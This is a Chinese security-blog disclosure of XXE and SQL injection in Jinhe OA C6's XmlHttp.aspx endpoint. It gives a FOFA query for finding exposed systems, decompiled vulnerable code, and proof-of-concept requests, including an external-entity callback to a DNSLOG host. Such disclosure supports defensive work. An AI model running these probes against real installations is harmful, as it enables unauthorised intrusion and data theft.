---
title: "金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-Archives-XmlHttp-xxe-sqli.html
asset_dir: assets/金和oa-jhsoft.web.archivesxmlhttp.aspx-xxe+sql注入漏洞
---

# 金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/21 13:32
- 425浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

SQL注入防护

恶意软件分析工具

网络安全课程

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.Archives/XmlHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `Jhsoft.Web.Archives/XmlHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Archives.dll` 将其进行反编译后找到 **ArchivesRoomDeptSave** 的处理逻辑

```
public class XmlHttp : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
    string QueryString = $"select ArchivesID from Archives where ArchivesID in ({xmlDocument.SelectSingleNode("//Root//ArchivesId").InnerText}) and (ArchivesGD=1 or DelFlag=1)";
    DataTable dataTable = DBOperatorFactory.GetDBOperator().ExecSQLReDataTable(QueryString);
    if (((InternalDataCollectionBase) dataTable.Rows).Count > 0 && dataTable != null)
      this.Response.Write("y");
    else
      this.Response.Write("n");
  }
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Archives/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

代码安全审计

[![金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.Archives/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<Root><ArchivesId>SQLI_POC</ArchivesId></Root>
```

[![金和OA Jhsoft.Web.Archives/XmlHttp.aspx XXE+SQL注入漏洞](images/img-002-1f52559efce5.webp)](https://image.mrxn.net/41e58921ba3d4b82a98345c8664d5b7c.webp)

成功延时 4 秒

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALj0lEQVR4AeyajXLbOAyE8/X93/nOq81S4I9kNU1jz1SZoAssFiBNiI6Tu18fHx//fdX++/xa1X+mWu8xrjVjLvEVrH3ip26MwwuTG1G5WHKJR0xemJz8PzEN5FF/f7/LCbSBPCb8cdXGzaeu8sAHUKnJX9VNok8C2PqB8ZNe7jm5EcG1QKs704y5xOA+2b8wuaC4q5YaYRuIgttefwLTQMDThxm/st08JeB+iYVgDozpD45hx+RUJ4M9B2s/NSsE16jXka3qfpcDrwMzrnpNA1mJbu7nTuBbBgKefn3S8hLAuTEGQk3v57XP6LeiT6fmP6kGyQHbz5+WeDhnuUf60je4L3BJf0X0LQO5stCtuXYC3zKQ8WmD/VNMctlO4opjLjGwPdlAqMMYdk0Tfzp1rfjA1utTsvlAwg1HLbDptuRf+udbBvKX9vZPtv07A/knj/J7XvQ0kFzTFT5bstZEC8fXHJyDHlN7hnWt0R/rwP1HXnFq5Y8GfV20KxxrE6+04aKpOA2kJm//50+gDQT8NMBzHLcJrqk8mDt7GqK/ool2RPA6wJj6tjj7A7of6uAYmNYCNi08x1rcBlLJ23/dCfzK9L+C2XZqYX8awkUThF0TbkSwJj2EYG7UKhcbc1dicN/0AMfAlfJJkz5fxfuGTEf6WmIaCLC992Vb4BhmHDWJV3j2xKz0zziY9wPmUguOszY4hv0X12iD0QrDgevEycLLj4E1ya0Q1howD3xMA/m4v156AocDAU9ttbsrTwWs68E80FoD261M3yCYB5o2TjSJheFGBKb+YE51R5Y+Yx7m2lEL1sCOV/ocDmQsfoP4n9jCPZA3G/Mv8JUa95UruEJwTXKpTVwxuWDNwboP9HytSR+wJrEQzIFR3DNL7+jAtbDjqEkMuyb1I0YrTA5cl7jifUPqabyB3wYCnpomKQPHMKPysnH/MGujAecSC9VDBs6BUbnRwDnpq1Vd+MpVH9wD5o+94Fx6CGtt9WHWgrnoVC8D87CvKV42asW1gSR542tPoA1E05GBJ3q2LbAGjGfa5NRblriieFk4+bLEQsUy+TKY14aZk1Z1o4mXQV8DjgGlNwO2j81b8PgnvR5u+w4H1oKxCRZOamqqDaSSt/+6E2h/XARPNFP7CtaXkfrKyQevAzuKrwZ7Dnq/6kY/awbHPPS9YH5fT+0Kx36rOHXJJRbCvD703H1DcnJvgvdA3mQQ2UYbiK6ULIkg7FdqxQGhOwS2H4Rg7JJDAL1G+5ANsi5UfjRwH+ixK/wMUgvWftLdnsE5MI6axELoNemvXGzFJRdsAwlx42tPYPrTCfSTrtsD5zLpYDSJKya3wuiSSwzzOtGAc2AML0z9iGBt5cGc6q4aHNekN1gDxlXvaINVc9+Qehpv4LeBgCeaqUEfhxeCc9Dj6vVIL1vlfodTj2qrWuj3A45X2pGDY23WHWtqDK4ftWAedkwdmEuNsA0kohtfewLtF8NsA/qpgWPYUZNcWXpUBNdVLj70OXCc3uAYSEnDaBrxcMIdIdA+RT3k3XdqOnIIognW9MglXiF4H6kHx8D939Q/3uyrvWVlktkfeGrhK4Jz8BzTb4W1Z/XBfWsNmIMeq2b0wdqRV5z15MvA2vAVla8G1lZu9OFYk95jjeI2EAW3fdsJfLnRPZAvH93fKWwDgf6K5VqBedgxuSuYbYPra82YA2vCV+2RH21FcJ/UJJdYCGtNtEKwRr4M+lhcDNY5MA9EeoptIKeqO/ljJ9D+dKKnRpaVge0jYuKK4Bz0WDXx1bNaeCG4vublKycD5wGFmwHbvuAYN+HjH7Dm4U7fWkeWhHwZuAZIqq0XQjoZMOXAXLRXUL1i9w25cmI/qGm/GIInm0kF617CjVg1ow/uO/KK00e+DKwNXxGck05Wc6OvvCw89LXKjQbHmvQJjrWKkxtRuWcGXhu4fzH8eLOv9paVyWZ/4KklrgjHuapb+eBaYJXeOGB7b96CJ/+AtcCkBA77wDqXcxCmIay1yVeE69paF78NJMSNrz2BeyCvPf9p9faxF/qrpisrmyoehHjZw336LZ0M3F9+DMyBMXwQzAOH60QrHEXiqgHbWxjs//sPmBtrFdda+WAtGKUZTTrZyK9i6WQ1d9+Qehpv4LeBaFIy8PTBWPcI5qDHqvkTH9z3Sg+wFmZMPTiXWK8vBn0umoqw1qTHSguuAeNKUzn56SdsA1HittefwNOBaGqxbDfxiMlXBD8p0YJj2N/Hq14+WJOaM5Q+Ft1RDO4L89pjrXqEA9clVk6WeIXKy1Y5cD/lZeAYuH8x/Hizr/ank+xrnGj4irBPFKipp37tD2yfesKlODE4DyS16WGPW+LhAFs+9Q/q8je4thaAufQDx/Acz2qyBrhPYuHTtyyJbvu5E2i/h2RJ8NTAGF6YqQfFVQPXwI7RgrmqP8tJl7wQXC9fpvxo4mVgbfLgWLkYmIsmCOaBUBOmR02sOOXDn6F0sfuG5CTeBF8wkDd55W+6jTYQYPuBeGWf0GvBcb2W6QN9LvwKUw+uWWnCgTWpEULPRaucLHFF8dVqLj6s+yYvBGvky6CPxV2xNpAr4lvz90+gfeytT0n16xbAU6/56oPzQCtLHnh6A8GasQb2X+TAmrZAcVJXqKcuPO839oXfr6kbgb4+/YX3Dakn9Qb+NBDw9MBY96gJyqDPgWPlYrVOfniwFnZUXhaNfFliIVgvv5p0MbAm8YjgPOw3Lr3AucTCsT6xcqMlB+4zxkCohsD2rgE7TgNp6tt5yQl8aSB5OsCTTVxfwYqrefnRBMH9lBtt1IC1sOORZuy1io9qYe8P9lMPjmG/cckF01e44sRX+9JA0vjG7z+BeyDff6Z/1LENBHz90i3XKLEQrAGjOBn0sbgYOAfG9BVGExQnA2vDC8Gc8isTJ101cTKYa6MD58AYvqJ6VKu50Y9u5FcxzGu2gawKbu7nT2D6a28mDPP0sr1oRgTXwI5jTWIh7DpA1GbpC7SPhVui/APOFepQe9YvuWDtFx/6taCPpYOegz6W5sjAWuD+L4Yfb/Y1/ekk+8sTA/v0Ri7a30GY+6Ue9hzsHyWzrjDa30Fw31oD5sBYc6OvdWXh5csSV4S+HzgGmgzYbnMjinP/DCmH8Q5uGwh4atDjapN6OmRwrFVetqofOelWBn1/YCzdnjRgw/SYRCfElRpwfzCu2l3pk7pog+GFbSAKbnv9CbRPWZlW8GxrcPykpA6sOesH1oAxtWcIx1pY51Z7CAeuAePZ2mc5eF4PzzX3DTk75Rfk7oGcHvrPJ9vH3nHpXOmK0VROfvgzBF9X6WNHerC25seaxCusddWvWpjXkLZqFMsqJx/mWvErU30s+cQw97lvSE7nTbD9UAdPC65jXsM4+fAVzzTJgddOXOuPfHANMEmA7eMwzDiukRh27chNCywIcP0iNe0l/av2viH1NN7AbwPJtK7guG+Yn4r0AedgxmjSLzFYG/4MUyMcdeJkI68Y1mtIH4NeA32sPqOlduQVJxeEuV8biApue/0JTAMBTw1m/JPt5qmoPWBeA2iS1AiB7T04SXAMM46axOozWnJB2PuFS81RLB72Oth95WJgPnEw/YXTQCK68TUncA/kNed+uOq3DERXTXa4ykFCNbKD9PYWBb7m0v2uHfWtfHqGS1xxzCVeYeqSS1xxzIFfI3D/F8OPN/v6lhsCnnB9bWAuTwb0sXiYOfHpIz8G1ia3Qug1qb2iBdfCjqkDc0dx+BWCa4GWBrbb34jifMtASr/b/cMTmAaSp2qFR2udacFPQzTgGGjtgO6JuaIF18COqWuNP50Vv+I+5RNEC15rEpwQqRWC6+XLoI/FTQM56X2nfuAE2kDA04LneLQv2GuPNCteT4ZszIk7smhrHrx+ctDH4YXgHBjFPbO61ug/q1U+NfKrgfcA3J+yPt7sq92QN9vXP7ud/wEAAP//BCjyVgAAAAZJREFUAwAKoauVzPO+tAAAAABJRU5ErkJggg==)

手机扫码阅读
